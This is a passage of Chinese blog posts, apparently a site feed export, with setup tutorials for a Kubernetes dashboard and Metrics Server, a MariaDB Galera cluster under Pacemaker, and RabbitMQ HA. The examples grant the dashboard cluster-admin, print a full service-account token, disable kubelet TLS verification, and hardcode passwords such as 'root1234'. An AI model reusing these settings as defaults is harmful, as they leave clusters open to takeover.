class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard-admin</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard-admin</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br></pre></td></tr></table></figure><h4 id="2-创建用户和角色绑定"><a href="#2-创建用户和角色绑定" class="headerlink" title="2. 创建用户和角色绑定"></a>2. 创建用户和角色绑定</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># kubectl apply -f dashboard-adminuser.yaml</span></span><br></pre></td></tr></table></figure><h4 id="3-查看-Token"><a href="#3-查看-Token" class="headerlink" title="3. 查看 Token"></a>3. 查看 Token</h4><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"># kubectl -n kube-system describe secret <span class="constructor">$(<span class="params">kubectl</span> -<span class="params">n</span> <span class="params">kube</span>-<span class="params">system</span> <span class="params">get</span> <span class="params">secret</span> | <span class="params">grep</span> <span class="params">kubernetes</span>-<span class="params">dashboard</span>-<span class="params">admin</span>-<span class="params">token</span> | <span class="params">awk</span> &#x27;&#123;<span class="params">print</span> $1&#125;&#x27;)</span></span><br><span class="line"></span><br><span class="line">Name:         kubernetes-dashboard-admin-token-xdrs6</span><br><span class="line">Namespace:    kube-system</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  kubernetes.io/service-account.name: kubernetes-dashboard-admin</span><br><span class="line">              kubernetes.io/service-account.uid: <span class="number">14082</span>a92-<span class="number">0e3</span>c-<span class="number">11e9</span>-ac3f-fa163e25b09e</span><br><span class="line"></span><br><span class="line">Type:  kubernetes.io/service-account-token</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJrdWJlcm5ldGVzLWRhc2hib2FyZC1hZG1pbi10b2tlbi14ZHJzNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJrdWJlcm5ldGVzLWRhc2hib2FyZC1hZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjE0MDgyYTkyLTBlM2MtMTFlOS1hYzNmLWZhMTYzZTI1YjA5ZSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTprdWJlcm5ldGVzLWRhc2hib2FyZC1hZG1pbiJ9.K9Z5NOY2MusdXhiFx6NdA42Jpo1cCChN16CKsdsw-<span class="number">9</span>eh76p1O4kd4u22_ZgWzhRwarnllURXieDxEGpRmCJaBOmMo_xFmlCX6fxFQ-<span class="number">7</span>bWcXuWWpi3ay5qSOPsv_7EyvCvkFSFVfgMnppu3dvEhD5NoeSjnrkHshHxFFnhZc7ePIUVlY9KvMVWv7UDkhinJKy5HjLu_ejwy2jxmSNwZ-g9wnLVzw3-XObmUUL8nTRdE8KehKtpdo6Kd-BJlmfTNUPiSGxrcU1sW1hzwJLsEfTix4oQOhdCh2-z37Gr_1J7-bnf8F5_U90okH2nf1it2brmIM3JbzuQ8sWERx66gEkKQ</span><br><span class="line">ca.crt:     <span class="number">1025</span> <span class="built_in">bytes</span></span><br><span class="line">namespace:  <span class="number">11</span> <span class="built_in">bytes</span></span><br></pre></td></tr></table></figure><p>保存 token 部分的内容</p><h3 id="部署-Metrics-Server"><a href="#部署-Metrics-Server" class="headerlink" title="部署 Metrics Server"></a>部署 Metrics Server</h3><p>Heapter 将在 Kubernetes 1.13 版本中移除（<a href="https://github.com/kubernetes/heapster/blob/master/docs/deprecation.md">https://github.com/kubernetes/heapster/blob/master/docs/deprecation.md</a>），推荐使用 metrics-server 与 Prometheus。</p><h4 id="1-导入-metrics-server-镜像"><a href="#1-导入-metrics-server-镜像" class="headerlink" title="1. 导入 metrics-server 镜像"></a>1. 导入 metrics-server 镜像</h4><p>下载地址：<a href="https://pan.baidu.com/s/1dKNbg7b9IBtPBnadLUADlg">metrics-server.tar</a></p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># docker <span class="keyword">load</span> -i metrics-<span class="keyword">server</span>.tar</span><br></pre></td></tr></table></figure><h4 id="2-保存配置文件"><a href="#2-保存配置文件" class="headerlink" title="2. 保存配置文件"></a>2. 保存配置文件</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># mkdir metrics-server</span></span><br><span class="line"><span class="meta"># cd metrics-server</span></span><br><span class="line"><span class="meta"># wget https://github.com/kubernetes-incubator/metrics-server/raw/master/deploy/1.8%2B/aggregated-metrics-reader.yaml</span></span><br><span class="line"><span class="meta"># wget https://github.com/kubernetes-incubator/metrics-server/raw/master/deploy/1.8%2B/auth-delegator.yaml</span></span><br><span class="line"><span class="meta"># wget https://github.com/kubernetes-incubator/metrics-server/raw/master/deploy/1.8%2B/auth-reader.yaml</span></span><br><span class="line"><span class="meta"># wget https://github.com/kubernetes-incubator/metrics-server/raw/master/deploy/1.8%2B/metrics-apiservice.yaml</span></span><br><span class="line"><span class="meta"># wget https://github.com/kubernetes-incubator/metrics-server/raw/master/deploy/1.8%2B/metrics-server-deployment.yaml</span></span><br><span class="line"><span class="meta"># wget https://github.com/kubernetes-incubator/metrics-server/raw/master/deploy/1.8%2B/metrics-server-service.yaml</span></span><br><span class="line"><span class="meta"># wget https://github.com/kubernetes-incubator/metrics-server/raw/master/deploy/1.8%2B/resource-reader.yaml</span></span><br></pre></td></tr></table></figure><p>修改 metrics-server-deployment.yaml 文件修改镜像默认拉去策略为 IfNotPresent</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim metrics-server-deployment.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">k8s.gcr.io/metrics-server-amd64:v0.3.1</span></span><br><span class="line">        <span class="comment">#imagePullPolicy: Always</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp-dir</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br></pre></td></tr></table></figure><p>修改使用 IP 连接并且不验证证书</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim metrics-server-deployment.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">k8s.gcr.io/metrics-server-amd64:v0.3.1</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">command:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/metrics-server</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--kubelet-insecure-tls</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--kubelet-preferred-address-types=InternalIP</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp-dir</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br></pre></td></tr></table></figure><h4 id="3-执行部署"><a href="#3-执行部署" class="headerlink" title="3. 执行部署"></a>3. 执行部署</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># kubectl apply -f ./</span></span><br></pre></td></tr></table></figure><h4 id="4-查看监控数据"><a href="#4-查看监控数据" class="headerlink" title="4. 查看监控数据"></a>4. 查看监控数据</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl top nodes</span></span><br><span class="line"><span class="attribute">NAME</span>         CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%   </span><br><span class="line"><span class="attribute">k8s</span>-master   <span class="number">196</span>m         <span class="number">4</span>%     <span class="number">1101</span>Mi          <span class="number">14</span>%       </span><br><span class="line"><span class="attribute">k8s</span>-node<span class="number">1</span>    <span class="number">44</span>m          <span class="number">1</span>%     <span class="number">2426</span>Mi          <span class="number">31</span>%       </span><br><span class="line"><span class="attribute">k8s</span>-node<span class="number">2</span>    <span class="number">38</span>m          <span class="number">0</span>%     <span class="number">2198</span>Mi          <span class="number">28</span>% </span><br><span class="line"></span><br><span class="line"><span class="comment"># kubectl top pod --all-namespaces</span></span><br><span class="line"><span class="attribute">NAMESPACE</span>     NAME                                   CPU(cores)   MEMORY(bytes)   </span><br><span class="line"><span class="attribute">kube</span>-system   coredns-<span class="number">86</span>c<span class="number">58</span>d<span class="number">9</span>df<span class="number">4</span>-<span class="number">8</span>zhr<span class="number">5</span>               <span class="number">3</span>m           <span class="number">13</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   coredns-<span class="number">86</span>c<span class="number">58</span>d<span class="number">9</span>df<span class="number">4</span>-jqn<span class="number">7</span>r               <span class="number">2</span>m           <span class="number">13</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   etcd-k<span class="number">8</span>s-master                        <span class="number">17</span>m          <span class="number">76</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   kube-apiserver-k<span class="number">8</span>s-master              <span class="number">30</span>m          <span class="number">402</span>Mi           </span><br><span class="line"><span class="attribute">kube</span>-system   kube-controller-manager-k<span class="number">8</span>s-master     <span class="number">36</span>m          <span class="number">63</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   kube-flannel-ds-amd<span class="number">64</span>-krf<span class="number">6</span>t            <span class="number">2</span>m           <span class="number">13</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   kube-flannel-ds-amd<span class="number">64</span>-tkftg            <span class="number">3</span>m           <span class="number">15</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   kube-flannel-ds-amd<span class="number">64</span>-zxzld            <span class="number">2</span>m           <span class="number">12</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   kube-proxy-<span class="number">5</span>znt<span class="number">7</span>                       <span class="number">2</span>m           <span class="number">14</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   kube-proxy-gl<span class="number">9</span>sl                       <span class="number">2</span>m           <span class="number">18</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   kube-proxy-q<span class="number">7</span>j<span class="number">7</span>m                       <span class="number">2</span>m           <span class="number">16</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   kube-scheduler-k<span class="number">8</span>s-master              <span class="number">9</span>m           <span class="number">16</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   kubernetes-dashboard-<span class="number">57</span>df<span class="number">4</span>db<span class="number">6</span>b-wtmkt   <span class="number">1</span>m           <span class="number">16</span>Mi            </span><br><span class="line"><span class="attribute">kube</span>-system   metrics-server-<span class="number">879</span>f<span class="number">5</span>ff<span class="number">6</span>d-<span class="number">9</span>q<span class="number">5</span>xw         <span class="number">1</span>m           <span class="number">13</span>Mi  </span><br></pre></td></tr></table></figure><h3 id="查看-Dashboard"><a href="#查看-Dashboard" class="headerlink" title="查看 Dashboard"></a>查看 Dashboard</h3><h4 id="1-查找-dashboard-服务端口"><a href="#1-查找-dashboard-服务端口" class="headerlink" title="1. 查找 dashboard 服务端口"></a>1. 查找 dashboard 服务端口</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get svc -n kube-system</span></span><br><span class="line"><span class="attribute">NAME</span>                   TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)         AGE</span><br><span class="line"><span class="attribute">kube</span>-dns               ClusterIP   <span class="number">10.96.0.10</span>      &lt;none&gt;        <span class="number">53</span>/UDP,<span class="number">53</span>/TCP   <span class="number">3</span>d<span class="number">19</span>h</span><br><span class="line"><span class="attribute">kubernetes</span>-dashboard   NodePort    <span class="number">10.109.196.92</span>   &lt;none&gt;        <span class="number">443</span>:<span class="number">30678</span>/TCP   <span class="number">17</span>h</span><br><span class="line"><span class="attribute">metrics</span>-server         ClusterIP   <span class="number">10.109.23.19</span>    &lt;none&gt;        <span class="number">443</span>/TCP         <span class="number">6</span>m<span class="number">16</span>s</span><br></pre></td></tr></table></figure><p>端口为: 30678</p><h4 id="2-访问-dashboard"><a href="#2-访问-dashboard" class="headerlink" title="2. 访问 dashboard"></a>2. 访问 dashboard</h4><p>访问地址为: <a href="https://172.20.6.116:30678/">https://172.20.6.116:30678</a> ,选择令牌，输入之前保存的 token 即可进入<br><img data-src="/images/uploads/2019/01/login.png" alt="login"><br><img data-src="/images/uploads/2019/01/dashboard.png" alt="dashboard"></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/golduty2/article/details/80700491">kubeadm 部署 kube1.10</a><br><a href="https://kubernetes.io/docs/setup/independent/create-cluster-kubeadm/">Creating a single master cluster with kubeadm</a><br><a href="https://www.cnblogs.com/Irving/p/9818440.html">使用 Kubeadm 安装部署 Kubernetes 1.12.1 集群</a><br><a href="https://juejin.im/entry/5c13894c6fb9a04a006ee615">kubeadm快速部署Kubernetes（1.13.1，HA）</a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kubernetes </tag>
            
            <tag> kubeadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用pacemaker配置mariadb高可用集群</title>
      <link href="openstack/MariaDB-High-availability-with-Pacemaker.html"/>
      <url>openstack/MariaDB-High-availability-with-Pacemaker.html</url>
      
        <content type="html"><![CDATA[<p>Galera cluster是一个多主同步数据库集群，基于同步复制技术和 Oracle 的 MYSQL/InnoDB。使用Galera Cluster时，您可以直接任意节点读取和写入。并且在丢失任何单个节点时可以不中断操作且无需处理复杂故障转移过程。<br><img data-src="/images/uploads/2018/11/galera.png" alt="galera"><br>下面介绍如何为openstack环境配置mariadb galera高可用集群。</p><span id="more"></span><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><h3 id="主机配置"><a href="#主机配置" class="headerlink" title="主机配置"></a>主机配置</h3><p>配置三个节点，使用openstack的控制节点<br>192.168.100.161 controller01<br>192.168.100.162 controller02<br>192.168.100.163 controller03</p><h3 id="Haproxy配置"><a href="#Haproxy配置" class="headerlink" title="Haproxy配置"></a>Haproxy配置</h3><p>haproxy 添加以下配置</p><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">frontend vip-db</span><br><span class="line">    bind 192.168.100.160:3306</span><br><span class="line">    timeout client 90m</span><br><span class="line">    default_backend db-galera</span><br><span class="line">backend db-galera</span><br><span class="line">    option httpchk</span><br><span class="line">    option tcpka</span><br><span class="line">    stick-table type ip size 1000</span><br><span class="line">    stick on dst</span><br><span class="line">    timeout server 90m</span><br><span class="line">    server controller01 192.168.100.161:3306<span class="built_in"> check </span>inter 1s port 9200 backup on-marked-down shutdown-sessions</span><br><span class="line">    server controller02 192.168.100.162:3306<span class="built_in"> check </span>inter 1s port 9200 backup on-marked-down shutdown-sessions</span><br><span class="line">    server controller03 192.168.100.163:3306<span class="built_in"> check </span>inter 1s port 9200 backup on-marked-down shutdown-sessions</span><br></pre></td></tr></table></figure><p>其中 192.168.100.160 是 vip 地址</p><h2 id="数据库集群的安装"><a href="#数据库集群的安装" class="headerlink" title="数据库集群的安装"></a>数据库集群的安装</h2><h3 id="安装和配置组件（所有节点）"><a href="#安装和配置组件（所有节点）" class="headerlink" title="安装和配置组件（所有节点）"></a>安装和配置组件（所有节点）</h3><ol><li><p>安装软件包</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install -y mariadb mariadb-galera-server mariadb-galera-common galera rsync xinetd</span></span><br></pre></td></tr></table></figure></li><li><p>创建 /etc/my.cnf.d/openstack.cnf 文件，加入以下内容</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/my.cnf.d/openstack.cnf</span></span><br><span class="line"></span><br><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">bind-address</span> = <span class="number">192.168</span>.<span class="number">100.161</span>   <span class="comment">#本机管理ip</span></span><br><span class="line"></span><br><span class="line"><span class="attr">default-storage-engine</span> = innodb</span><br><span class="line"><span class="attr">innodb_file_per_table</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">max_connections</span> = <span class="number">4096</span></span><br><span class="line"><span class="attr">collation-server</span> = utf8_general_ci</span><br><span class="line"><span class="attr">character-set-server</span> = utf8</span><br></pre></td></tr></table></figure></li><li><p>修改 mariadb 最大连接数</p></li></ol><ul><li>修改  /usr/lib/systemd/system/mariadb.service 文件加入以下内容<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /usr/lib/systemd/system/mariadb.service</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">LimitNOFILE</span>=<span class="number">10000</span></span><br><span class="line"><span class="attr">LimitNPROC</span>=<span class="number">10000</span></span><br></pre></td></tr></table></figure></li><li>重新加载服务<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># systemctl --<span class="keyword">system</span> daemon-reload</span><br></pre></td></tr></table></figure></li></ul><h3 id="配置galera-cluster（所有节点）"><a href="#配置galera-cluster（所有节点）" class="headerlink" title="配置galera cluster（所有节点）"></a>配置galera cluster（所有节点）</h3><p>编辑 /etc/my.cnf.d/galera.cnf 文件，修改如下内容</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat &gt; /etc/my.cnf.d/galera.cnf &lt;&lt; EOF</span></span><br><span class="line">[mysqld]</span><br><span class="line"><span class="attribute">skip-name-resolve</span>=1</span><br><span class="line"><span class="attribute">binlog_format</span>=ROW</span><br><span class="line"><span class="attribute">default-storage-engine</span>=innodb</span><br><span class="line"><span class="attribute">innodb_autoinc_lock_mode</span>=2</span><br><span class="line"><span class="attribute">bind-address</span>=192.168.100.161</span><br><span class="line"><span class="attribute">wsrep_on</span>=1</span><br><span class="line"><span class="attribute">wsrep_provider</span>=/usr/lib64/galera/libgalera_smm.so</span><br><span class="line"><span class="attribute">wsrep_provider_options</span>=<span class="string">&quot;pc.recovery=TRUE;gcache.size=300M&quot;</span></span><br><span class="line"><span class="attribute">wsrep_cluster_name</span>=<span class="string">&quot;openstack_cluster&quot;</span></span><br><span class="line"><span class="attribute">wsrep_cluster_address</span>=<span class="string">&quot;gcomm://controller01,controller02,controller03&quot;</span></span><br><span class="line"><span class="attribute">wsrep_node_name</span>=<span class="string">&quot;controller01&quot;</span>                         #主机名</span><br><span class="line"><span class="attribute">wsrep_node_address</span>=<span class="string">&quot;192.168.100.161&quot;</span>                   #ip地址</span><br><span class="line"><span class="attribute">wsrep_slave_threads</span>=1</span><br><span class="line"><span class="attribute">wsrep_certify_nonPK</span>=1</span><br><span class="line"><span class="attribute">wsrep_max_ws_rows</span>=131072</span><br><span class="line"><span class="attribute">wsrep_max_ws_size</span>=1073741824</span><br><span class="line"><span class="attribute">wsrep_debug</span>=0</span><br><span class="line"><span class="attribute">wsrep_convert_LOCK_to_trx</span>=0</span><br><span class="line"><span class="attribute">wsrep_retry_autocommit</span>=1</span><br><span class="line"><span class="attribute">wsrep_auto_increment_control</span>=1</span><br><span class="line"><span class="attribute">wsrep_drupal_282555_workaround</span>=0</span><br><span class="line"><span class="attribute">wsrep_causal_reads</span>=0</span><br><span class="line">wsrep_notify_cmd=</span><br><span class="line"><span class="attribute">wsrep_sst_method</span>=rsync</span><br><span class="line"><span class="attribute">wsrep_sst_auth</span>=root:</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="配置-haproxy-健康检查（所有节点）"><a href="#配置-haproxy-健康检查（所有节点）" class="headerlink" title="配置 haproxy 健康检查（所有节点）"></a>配置 haproxy 健康检查（所有节点）</h3><ol><li>安装 xinted 服务<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install xinetd -y</span></span><br></pre></td></tr></table></figure></li><li>登录数据库，创建 clustercheck 用户，并设置其本地访问数据库的权限<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"># systemctl start mariadb.service</span><br><span class="line"># mysql -e &quot;<span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;clustercheck&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;root1234&#x27;</span>;&quot;</span><br><span class="line"># systemctl stop mariadb.service</span><br></pre></td></tr></table></figure></li><li>为 clustercheck 用户创建配置文件 /etc/sysconfig/clustercheck<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat &gt; /etc/sysconfig/clustercheck &lt;&lt; EOF</span></span><br><span class="line">MYSQL_USERNAME=<span class="string">&quot;clustercheck&quot;</span></span><br><span class="line">MYSQL_PASSWORD=<span class="string">&quot;root1234&quot;</span></span><br><span class="line">MYSQL_HOST=<span class="string">&quot;localhost&quot;</span></span><br><span class="line">MYSQL_PORT=<span class="string">&quot;3306&quot;</span></span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></li><li>创建个配置 HAProxy 监控服务 /etc/xinetd.d/galera-monitor<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat &gt; /etc/xinetd.d/galera-monitor &lt;&lt; EOF</span></span><br><span class="line">service galera-monitor</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">port</span> = <span class="number">9200</span></span><br><span class="line">  <span class="attr">disable</span> = no</span><br><span class="line">  <span class="attr">socket_type</span> = stream</span><br><span class="line">  <span class="attr">protocol</span> = tcp</span><br><span class="line">  <span class="attr">wait</span> = no</span><br><span class="line">  <span class="attr">user</span> = root</span><br><span class="line">  <span class="attr">group</span> = root</span><br><span class="line">  <span class="attr">groups</span> = yes</span><br><span class="line">  <span class="attr">server</span> = /usr/bin/clustercheck</span><br><span class="line">  <span class="attr">type</span> = UNLISTED</span><br><span class="line">  <span class="attr">per_source</span> = UNLIMITED</span><br><span class="line">  <span class="attr">log_on_success</span> =</span><br><span class="line">  <span class="attr">log_on_failure</span> = HOST</span><br><span class="line">  <span class="attr">flags</span> = REUSE</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></li><li>启动 xineted 并设置开机自启<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl daemon-reload</span></span><br><span class="line"><span class="meta"># systemctl enable xinetd</span></span><br><span class="line"><span class="meta"># systemctl start xinetd</span></span><br></pre></td></tr></table></figure><h3 id="完成安装"><a href="#完成安装" class="headerlink" title="完成安装"></a>完成安装</h3>创建数据库集群<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"># pcs resource <span class="keyword">create</span> galera-<span class="keyword">cluster</span> ocf:heartbeat:galera enable_creation=<span class="literal">true</span> wsrep_cluster_address=<span class="string">&quot;gcomm://controller01,controller02,controller03&quot;</span> additional_parameters=<span class="string">&#x27;--open-files-limit=16384&#x27;</span> enable_creation=<span class="literal">true</span> <span class="built_in">meta</span> master-<span class="built_in">max</span>=<span class="number">3</span> ordered=<span class="literal">true</span> op promote timeout=<span class="number">300</span>s <span class="keyword">on</span>-fail=block --master</span><br></pre></td></tr></table></figure>设置资源依赖<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># pcs <span class="keyword">constraint</span> <span class="keyword">order</span> <span class="keyword">start</span> haproxy-clone <span class="keyword">then</span> galera-<span class="keyword">cluster</span>-master</span><br></pre></td></tr></table></figure></li></ol><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>查看 pacemaker 资源</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pcs resource</span></span><br><span class="line">……</span><br><span class="line"> <span class="literal">Master</span>/<span class="literal">Slave</span> Set: galera-cluster-<span class="keyword">master</span> <span class="title">[galera-cluster</span>]</span><br><span class="line">     Masters: [ controller01 controller02 controller03 ]</span><br></pre></td></tr></table></figure><p>查看集群状态</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; SHOW STATUS like &#x27;wsrep_cluster_%&#x27;;</span><br><span class="line">+--------------------------+--------------------------------------+</span><br><span class="line">|<span class="string"> Variable_name            </span>|<span class="string"> Value                                </span>|</span><br><span class="line">+--------------------------+--------------------------------------+</span><br><span class="line">|<span class="string"> wsrep_cluster_conf_id    </span>|<span class="string"> 3                                    </span>|</span><br><span class="line">|<span class="string"> wsrep_cluster_size       </span>|<span class="string"> 3                                    </span>|</span><br><span class="line">|<span class="string"> wsrep_cluster_state_uuid </span>|<span class="string"> 83d58f96-e6e3-11e8-82ab-87f7bf579cc6 </span>|</span><br><span class="line">|<span class="string"> wsrep_cluster_status     </span>|<span class="string"> Primary                              </span>|</span><br><span class="line">+--------------------------+--------------------------------------+</span><br></pre></td></tr></table></figure><p>wsrep_cluster_size 为 3 集群成功创建。</p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> pacemaker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 pacemaker 配置 rabbitmq 高可用集群</title>
      <link href="openstack/RabbitMQ-High-availability-with-Pacemaker.html"/>
      <url>openstack/RabbitMQ-High-availability-with-Pacemaker.html</url>
      
        <content type="html"><![CDATA[<p>OpenStack 高可用集群各个服务组件之间使用消息队列进行通信，消息队列系统的高可用是 OpenStack 集群能够提供高可用服务的核心基础。在 OpenStack 中 Rabbitmq 是使用最多的高级消息队列系统。下文介绍如何使用 pacemaker 集群配置Rabbitmq 的高可用。</p><span id="more"></span><h3 id="安装和配置组件"><a href="#安装和配置组件" class="headerlink" title="安装和配置组件"></a>安装和配置组件</h3><ol><li><p>安装软件包</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum install rabbitmq-server -y</span></span><br></pre></td></tr></table></figure></li><li><p>防止网络分区</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/rabbitmq/rabbitmq.config</span></span><br><span class="line">修改：</span><br><span class="line">%%  &#123;cluster_partition_handling, ignore&#125;,</span><br><span class="line">为：</span><br><span class="line">  &#123;cluster_partition_handling, pause_minority&#125;</span><br></pre></td></tr></table></figure></li><li><p>修改监听地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;NODE_IP_ADDRESS=<span class="variable">$&#123;管理ip&#125;</span>&quot;</span> &gt; /etc/rabbitmq/rabbitmq-env.conf</span></span><br></pre></td></tr></table></figure></li><li><p>rabbitmq集群配置</p></li></ol><ul><li>创建自动创建用户设置权限的脚本<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">Vim /usr/<span class="keyword">local</span>/sbin/set_rabbitmq_policy</span><br><span class="line"></span><br><span class="line"># This script is called <span class="keyword">by</span> rabbitmq-server-ha.ocf during RabbitMQ</span><br><span class="line"># <span class="keyword">cluster</span> start up. It is a convenient place to <span class="keyword">set</span> your <span class="keyword">cluster</span></span><br><span class="line"># policy here, <span class="keyword">for</span> example:</span><br><span class="line">#<span class="variable">$&#123;OCF_RESKEY_ctl&#125;</span> set_policy ha-all <span class="string">&quot;.&quot;</span> &#x27;&#123;<span class="string">&quot;ha-mode&quot;</span>:<span class="string">&quot;all&quot;</span>, <span class="string">&quot;ha-sync-mode&quot;</span>:<span class="string">&quot;automatic&quot;</span>&#125;&#x27; --apply-to all --priority 0</span><br><span class="line"><span class="variable">$&#123;OCF_RESKEY_ctl&#125;</span> set_policy ha-all <span class="string">&quot;.&quot;</span> &#x27;&#123;<span class="string">&quot;ha-mode&quot;</span>:<span class="string">&quot;all&quot;</span>, <span class="string">&quot;ha-sync-mode&quot;</span>:<span class="string">&quot;automatic&quot;</span>&#125;&#x27; --apply-to all --priority 0</span><br><span class="line">#add user usage:user passwd</span><br><span class="line"><span class="variable">$&#123;OCF_RESKEY_ctl&#125;</span> add_user openstack 7136fb0c6ac12946e06f</span><br><span class="line"><span class="variable">$&#123;OCF_RESKEY_ctl&#125;</span> set_permissions 